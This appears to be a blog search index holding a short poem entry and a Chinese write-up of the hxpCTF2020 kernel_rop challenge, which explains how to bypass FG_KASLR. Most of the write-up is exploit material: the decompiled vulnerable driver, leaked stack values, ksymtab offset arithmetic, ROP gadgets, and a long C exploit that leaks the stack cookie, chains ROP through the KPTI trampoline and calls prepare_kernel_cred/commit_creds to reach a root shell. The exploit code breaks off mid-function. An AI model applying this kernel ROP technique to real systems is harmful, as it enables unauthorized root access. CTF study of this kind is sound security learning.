<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>城南没有雨</title>
      <link href="/2024/04/19/%E5%9F%8E%E5%8D%97%E6%B2%A1%E6%9C%89%E9%9B%A8/"/>
      <url>/2024/04/19/%E5%9F%8E%E5%8D%97%E6%B2%A1%E6%9C%89%E9%9B%A8/</url>
      
        <content type="html"><![CDATA[<p>人生犹似西山日，富贵终如草上霜。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Kernel_pwn FG_KASLR in ROP</title>
      <link href="/2021/02/10/kernel_pwn(fg_kaslr)/"/>
      <url>/2021/02/10/kernel_pwn(fg_kaslr)/</url>
      
        <content type="html"><![CDATA[<h3 id="Kernel-pwn-FG-KASLR-in-ROP"><a href="#Kernel-pwn-FG-KASLR-in-ROP" class="headerlink" title="Kernel_pwn FG_KASLR in ROP"></a>Kernel_pwn FG_KASLR in ROP</h3><blockquote><p>第一次遇到FG_KASLR机制，算是KASLR的加强版，加大了一些ROP的难度，但仍有bypass的方法。题目来自hxpCTF2020 kernel_rop。</p></blockquote><span id="more"></span><h4 id="FG-KASLR"><a href="#FG-KASLR" class="headerlink" title="FG_KASLR"></a><code>FG_KASLR</code></h4><p>首先了解下FG_KASLR：<br>全称是<code>Function Granular KASLR</code>，译为函数颗粒化地址随机分布。我们知道，开启一般的KASLR会使得每次目标文件加载到的内存起始地址会随机化，但只要能leak一个在相应内存区域的地址，我们就能通过其offset固定的原因得到任何一个在此内存区域的地址。</p><p>文档对FG_KASLR描述为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">This patch set is an implementation of finer grained kernel address space</span><br><span class="line">randomization. It rearranges your kernel code at load time </span><br><span class="line">on a per-function level granularity, with only around a second added to</span><br><span class="line">boot time.</span><br></pre></td></tr></table></figure><p>和KASLR不同，FG_KASLR做了更随机化。它在load的时候按照函数级别的细粒度来重排内核代码，这样做它的boot time增加了1秒，但使得我们通过offset的方法得到真实地址的方法”破灭“。即使我们leak出了一个在.text段的地址，但FG_KASLR是函数级上的随机化，对函数的重排使得offset也变得随机化，我们也就无法通过<code>leak_addr+offset</code>来确定地址了。</p><p>这是我一开始看到这个机制的想法，但当我做到一道开了FG_KASLR的kernel_pwn之后，才发现我too yuang too simple了。</p><h4 id="hxpCTF2020-kernel-rop"><a href="#hxpCTF2020-kernel-rop" class="headerlink" title="hxpCTF2020 kernel_rop"></a><code>hxpCTF2020 kernel_rop</code></h4><p>拿到题目后发现内核版本为<code>vmlinuz: Linux kernel x86 boot executable bzImage, version 5.9.0-rc6+</code>算是比较新了。</p><p>接着查看<code>etc/init.d/</code>里的rcS初始化脚本看到<code>insmod了hackme.ko</code>，应该就是有漏洞的模块了。</p><p>模块提供了<code>hackme_read()</code>和<code>hackme_write()</code>功能，漏洞在write功能里：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">ssize_t</span> __fastcall <span class="title">hackme_write</span><span class="params">(file *f, <span class="type">const</span> <span class="type">char</span> *data, <span class="type">size_t</span> size, <span class="type">loff_t</span> *off)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">ssize_t</span> v5; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">int</span> tmp[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-A0h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+80h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  _fentry__();</span><br><span class="line">  v5 = v4;</span><br><span class="line">  v8 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( v4 &gt; <span class="number">0x1000</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    _warn_printk(<span class="string">&quot;Buffer overflow detected (%d &lt; %lu)!\n&quot;</span>, <span class="number">4096LL</span>);</span><br><span class="line">    <span class="built_in">BUG</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  _check_object_size(hackme_buf, v4, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">copy_from_user</span>(hackme_buf, data, v5) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-14LL</span>;</span><br><span class="line">  _memcpy(tmp, hackme_buf, v5);</span><br><span class="line">  <span class="keyword">return</span> v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>_memcpy(tmp, hackme_buf, v5);</code>造成栈溢出。因此利用方法就比较明确了，先利用read功能leak地址，找gadgets，之后rop执行<code>commit_creds(prepare_kernel_cred(0))</code>提权。</p><p>首先leak地址：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read(global_fd, leak, sizeof(leak));</span><br></pre></td></tr></table></figure><p>传入一个leak数组，看下都读到了啥：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">0: 0xffff888007201020                                                     </span><br><span class="line">1: 0xfe0</span><br><span class="line">2: 0x71e8e82fd1c6c600</span><br><span class="line">3: 0xffff88800647b210</span><br><span class="line">4: 0xffffc900001c7e68</span><br><span class="line">5: 0x4</span><br><span class="line">6: 0xffff88800647b200</span><br><span class="line">7: 0xffffc900001c7ef0</span><br><span class="line">8: 0xffff88800647b200</span><br><span class="line">9: 0xffffc900001c7e80</span><br><span class="line">10: 0xffffffff8184e047</span><br><span class="line">11: 0xffffffff8184e047</span><br><span class="line">12: 0xffff88800647b200</span><br><span class="line">13: (nil)</span><br><span class="line">14: 0x7fff6f105830</span><br><span class="line">15: 0xffffc900001c7ea0</span><br><span class="line">16: 0x71e8e82fd1c6c600</span><br><span class="line">17: 0x140</span><br><span class="line">18: (nil)</span><br><span class="line">19: 0xffffc900001c7ed8</span><br><span class="line">20: 0xffffffff816d51ff</span><br><span class="line">21: 0xffff88800647b200</span><br><span class="line">22: 0xffff88800647b200</span><br><span class="line">23: 0x7fff6f105830</span><br><span class="line">24: 0x140</span><br><span class="line">25: (nil)</span><br><span class="line">26: 0xffffc900001c7f20</span><br><span class="line">27: 0xffffffff816d5727</span><br><span class="line">28: 0xffffffff8152b8a1</span><br><span class="line">29: (nil)</span><br><span class="line">30: 0x71e8e82fd1c6c600</span><br><span class="line">31: 0xffffc900001c7f58</span><br><span class="line">32: (nil)</span><br><span class="line">33: (nil)</span><br><span class="line">34: (nil)</span><br><span class="line">35: 0xffffc900001c7f30</span><br><span class="line">36: 0xffffffff816d577a</span><br><span class="line">37: 0xffffc900001c7f48</span><br><span class="line">38: 0xffffffff8100a157</span><br><span class="line">39: (nil)</span><br></pre></td></tr></table></figure><p>多重复leak几次后会发现<code>leak[38]</code>处的<code>0xffffffff8100a157</code>是没变化的，而且这个地址是kernel image里的地址，因此通过这个地址我们容易得到image_base的地址。<br>接着我们先手动root下，通过<code>/proc/kallsyms</code>去找找函数地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">38: 0xffffffffa820a157                                    </span><br><span class="line">39: (nil)      </span><br><span class="line">image base: 0xffffffffa8200000</span><br><span class="line">/ # cat /proc/kallsyms | grep &quot;commit_creds&quot;</span><br><span class="line">ffffffffa8c93f90 T commit_creds</span><br><span class="line">ffffffffa9187d90 r __ksymtab_commit_creds</span><br><span class="line">ffffffffa91a0972 r __kstrtab_commit_creds</span><br><span class="line">ffffffffa91a4d42 r __kstrtabns_commit_creds</span><br><span class="line"></span><br><span class="line">38: 0xffffffffb260a157</span><br><span class="line">39: (nil)</span><br><span class="line">image base: 0xffffffffb2600000</span><br><span class="line">/ # cat /proc/kallsyms | grep &quot;commit_creds&quot;</span><br><span class="line">ffffffffb2a2e6c0 T commit_creds</span><br><span class="line">ffffffffb3587d90 r __ksymtab_commit_creds</span><br><span class="line">ffffffffb35a0972 r __kstrtab_commit_creds</span><br><span class="line">ffffffffb35a4d42 r __kstrtabns_commit_creds</span><br></pre></td></tr></table></figure><p>上面是两次启动qemu后先leak地址在通过<code>/proc/kallsyms</code>查看函数地址得到的结果。<code>commit_creds</code>函数和<code>image_base</code>的offset分别为0xa93f90和0x42e6c0，可以看到，我们无法通过<code>image_base+offset</code>来得到<code>commit_creds()</code>的地址，这也是开启了FG_KASLR的效果。</p><p>但在计算<code>__ksymtab_commit_creds</code>和<code>image_base</code>的偏移时发现：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; hex(0xffffffffa9187d90-0xffffffffa8200000)</span><br><span class="line">&#x27;0xf87d90L&#x27;</span><br><span class="line">&gt;&gt;&gt; hex(0xffffffffb3587d90-0xffffffffb2600000)</span><br><span class="line">&#x27;0xf87d90L&#x27;</span><br></pre></td></tr></table></figure><p>offset是固定的。可以看到，FG_KASLR并没有做到Kernel地址的完全随机化，没有受到影响的区域如下：</p><p>1、存在于<code>.text_base</code>到<code>__x86_retpoline_r15(.text+400dc6)</code>的函数没有受到影响。显然<code>commit_creds</code>和<code>prepare_kernel_cred()</code>没有包含在内，但我们还是可以在这里找一些gadget的。</p><p>2、KPIT trampoline<code>swapgs_restore_regs_and_return_to_usermode()</code>没有受到影响。</p><p>3.内核符号表(kernel symbol table)ksymtab开始于<code>.text+0xf85198</code>没有受到影响。</p><p>这也说明了我们计算<code>__ksymtab_commit_creds</code>的偏移固定的原因。ksymtab的结构如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">kernel_symbol</span> &#123;</span><br><span class="line">  <span class="type">int</span> value_offset;</span><br><span class="line">  <span class="type">int</span> name_offset;</span><br><span class="line">  <span class="type">int</span> namespace_offset;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其中<code>value_offset</code>是ksymtab到对应函数的偏移，以commit_creds函数为例就是<code>__ksymtab_commit_creds + value_offset = commit_creds</code>。</p><p>使用到的gadgets有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pop_rax_ret = image_base + 0x4d11;</span><br><span class="line">mov_eax_ind_rax_ret = image_base + 0x4aae;</span><br><span class="line">pop_rdi_ret = image_base + 0x38a0;</span><br></pre></td></tr></table></figure><p>思路如下：</p><p>1、通过read功能leak出<code>image_base</code>和stack里的<code>cookie</code>，分别对应<code>leak[38]</code>和<code>leak[2]</code>。</p><p>2、通过<code>image_base+offset</code>计算<code>__ksymtab_commit_creds</code>，<code>__ksymtab_prepare_kernel_cred()</code>以及gadgets地址。</p><p>3、构造ROP，利用gadget将ksymtab的<code>value_offset</code>存放rax，再利用<code>KPTI trampoline</code>返回userland得到其值，计算得真实函数地址，再做一次类似的ROP从而得到<code>commit_creds()</code>和<code>prepare_kernel_cred()</code>函数地址。</p><p>4、由于有KPTI而且我们的gadget里没有能类似<code>mov rdi, rax</code>的功能，只能分解利用的过程。我们的ROP应使用<code>KPTI trampoline</code>将提权分成两个stage：1.ROP执行<code>prepare_kernel_cred(0)</code>,执行结果于rax，利用<code>KPTI trampoline</code>返回userland得到rax值(即<code>cred_struct_va</code>)。2.ROP执行<code>commit_cred(cred_struct_va)</code>，利用<code>KPTI trampoline</code>返回userland执行<code>system(&#39;/bin/sh&#39;);</code>。</p><p>exp:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> global_fd;</span><br><span class="line"><span class="type">char</span> flag_buf[<span class="number">256</span>];</span><br><span class="line"><span class="type">uint64_t</span> cookie;</span><br><span class="line"><span class="type">uint64_t</span> image_base;</span><br><span class="line"><span class="type">uint64_t</span> swapgs_restore_regs_and_ret_to_uspace; <span class="comment">// start after popping rax</span></span><br><span class="line"><span class="type">uint64_t</span> zero_rax_ret; <span class="comment">// xor eax, eax; ret;</span></span><br><span class="line"><span class="type">uint64_t</span> write_mem_ret; <span class="comment">// mov qword ptr [rbx], rax; pop rbx; pop rbp; ret;</span></span><br><span class="line"><span class="type">uint64_t</span> pop_rax_ret; <span class="comment">// pop rax; ret</span></span><br><span class="line"><span class="type">uint64_t</span> mov_eax_ind_rax_ret; <span class="comment">// mov eax, qword ptr [rax + 0x10]; pop rbp; ret;</span></span><br><span class="line"><span class="type">uint64_t</span> pop_rdi_ret; <span class="comment">// pop rdi; pop rbp; ret;</span></span><br><span class="line"><span class="type">uint64_t</span> ksymtab_prepare_kernel_cred;</span><br><span class="line"><span class="type">uint64_t</span> ksymtab_commit_creds;</span><br><span class="line"><span class="type">uint64_t</span> prepare_kernel_cred;</span><br><span class="line"><span class="type">uint64_t</span> commit_creds;</span><br><span class="line"><span class="type">uint64_t</span> creds_struct_va;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> <span class="title class_">current_state</span>&#123;</span><br><span class="line">    current_state_read_ksymtab_prepare_kernel_cred,</span><br><span class="line">    current_state_read_ksymtab_commit_creds,</span><br><span class="line">    current_state_escalate_privileges_stage1,</span><br><span class="line">    current_state_escalate_privileges_stage2,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">safe_exit</span><span class="params">(<span class="type">void</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">open_dev</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> fd = <span class="built_in">open</span>(<span class="string">&quot;/dev/hackme&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;open faild!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> fd;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">save_state</span><span class="params">(<span class="type">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="built_in">asm</span>(</span><br><span class="line">        <span class="string">&quot;movq %%cs, %0\n&quot;</span></span><br><span class="line">        <span class="string">&quot;movq %%ss, %1\n&quot;</span></span><br><span class="line">        <span class="string">&quot;movq %%rsp, %3;\n&quot;</span></span><br><span class="line">        <span class="string">&quot;pushfq\n&quot;</span></span><br><span class="line">        <span class="string">&quot;pop %2\n&quot;</span></span><br><span class="line">        : <span class="string">&quot;=r&quot;</span>(user_cs), <span class="string">&quot;=r&quot;</span>(user_ss), <span class="string">&quot;=r&quot;</span>(user_rflags), <span class="string">&quot;=r&quot;</span>(user_sp)</span><br><span class="line">        :</span><br><span class="line">        : <span class="string">&quot;memory&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lx %lx %lx %lx\n&quot;</span>, user_cs, user_ss, user_rflags, user_sp);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">print_leak</span><span class="params">(<span class="type">uint64_t</span> leak[], <span class="type">int</span> n)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span> ; i &lt; n ; i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d: %p\n&quot;</span>,i ,leak[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">get_gadget_offset</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> n = <span class="number">40</span>;</span><br><span class="line">    <span class="type">uint64_t</span> leak[n];</span><br><span class="line">    <span class="built_in">read</span>(global_fd, leak, <span class="built_in">sizeof</span>(leak));</span><br><span class="line">    cookie = leak[<span class="number">2</span>];</span><br><span class="line">    image_base = leak[<span class="number">38</span>] - <span class="number">0xa157</span>;</span><br><span class="line">    swapgs_restore_regs_and_ret_to_uspace = image_base + <span class="number">0x200f10</span> + <span class="number">19</span>;</span><br><span class="line">    zero_rax_ret = image_base + <span class="number">0x3b91</span>;</span><br><span class="line">    pop_rax_ret = image_base + <span class="number">0x4d11</span>;</span><br><span class="line">    mov_eax_ind_rax_ret = image_base + <span class="number">0x4aae</span>;</span><br><span class="line">    pop_rdi_ret = image_base + <span class="number">0x38a0</span>;</span><br><span class="line">    ksymtab_prepare_kernel_cred = image_base + <span class="number">0xf8d4fc</span>UL;</span><br><span class="line">    ksymtab_commit_creds = image_base + <span class="number">0xf87d90</span>UL;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print_leak</span>(leak, n);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;cookie: %p\n&quot;</span>, cookie);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;image base: %p\n&quot;</span>, image_base);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> <span class="title class_">current_state</span> global_cstate;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">read_address</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> write_n = <span class="number">50</span>;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">16</span>;</span><br><span class="line">    <span class="type">uint64_t</span> rop[write_n];</span><br><span class="line">    rop[i++] = cookie;</span><br><span class="line">    rop[i++] = <span class="number">0</span>;            <span class="comment">// rbx</span></span><br><span class="line">    rop[i++] = <span class="number">0x1</span>;          <span class="comment">// r12</span></span><br><span class="line">    rop[i++] = <span class="number">0x20000000</span>;    <span class="comment">// rbp</span></span><br><span class="line">    rop[i++] = pop_rax_ret;</span><br><span class="line">    <span class="keyword">if</span>(global_cstate == current_state_read_ksymtab_prepare_kernel_cred)&#123;</span><br><span class="line">        rop[i++] = ksymtab_prepare_kernel_cred - <span class="number">0x10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(global_cstate == current_state_read_ksymtab_commit_creds)&#123;</span><br><span class="line">        rop[i++] = ksymtab_commit_creds - <span class="number">0x10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;state error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    rop[i++] = mov_eax_ind_rax_ret;</span><br><span class="line">    rop[i++] = user_sp; <span class="comment">// pop rbp</span></span><br><span class="line">    rop[i++] = swapgs_restore_regs_and_ret_to_uspace;</span><br><span class="line">    rop[i++] = <span class="number">0xccdd</span>;</span><br><span class="line">    rop[i++] = <span class="number">0x33333</span>;</span><br><span class="line">    rop[i++] = <span class="number">0x666666</span>;</span><br><span class="line">    rop[i++] = <span class="number">0x666666</span>;</span><br><span class="line">    rop[i++] = <span class="number">0x666666</span>;</span><br><span class="line">    rop[i++] = (<span class="type">uint64_t</span>)safe_exit;    <span class="comment">//rip</span></span><br><span class="line">    rop[i++] = user_cs;</span><br><span class="line">    rop[i++] = user_rflags;</span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line">    <span class="built_in">write</span>(global_fd, rop, <span class="built_in">sizeof</span>(rop));</span><br><span class="line">    <span class="comment">// Should never be reached</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">escalate_privileges</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> write_n = <span class="number">50</span>;</span><br><span class="line">    <span class="type">uint64_t</span> rop[write_n];</span><br><span class="line">    <span class="type">int</span> i = <span class="number">16</span>;</span><br><span class="line">    rop[i++] = cookie;</span><br><span class="line">    rop[i++] = <span class="number">0x0</span>; <span class="comment">// rbx</span></span><br><span class="line">    rop[i++] = <span class="number">0x1</span>; <span class="comment">// r12</span></span><br><span class="line">    rop[i++] = <span class="number">0x20000000</span>; <span class="comment">// rbp</span></span><br><span class="line">    <span class="keyword">if</span> (global_cstate == current_state_escalate_privileges_stage1)&#123;</span><br><span class="line">        rop[i++] = pop_rdi_ret; </span><br><span class="line">        rop[i++] = <span class="number">0</span>; <span class="comment">// rdi</span></span><br><span class="line">        rop[i++] = user_sp; <span class="comment">// rbp</span></span><br><span class="line">        rop[i++] = prepare_kernel_cred;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(global_cstate == current_state_escalate_privileges_stage2)&#123;</span><br><span class="line">        rop[i++] = pop_rdi_ret; </span><br><span class="line">        rop[i++] = creds_struct_va; <span class="comment">// rdi</span></span><br><span class="line">        rop[i++] = user_sp; <span class="comment">// rbp</span></span><br><span class="line">        rop[i++] = commit_creds;</span><br><span class="line">    &#125;</span><br><span class="line">    rop[i++] = 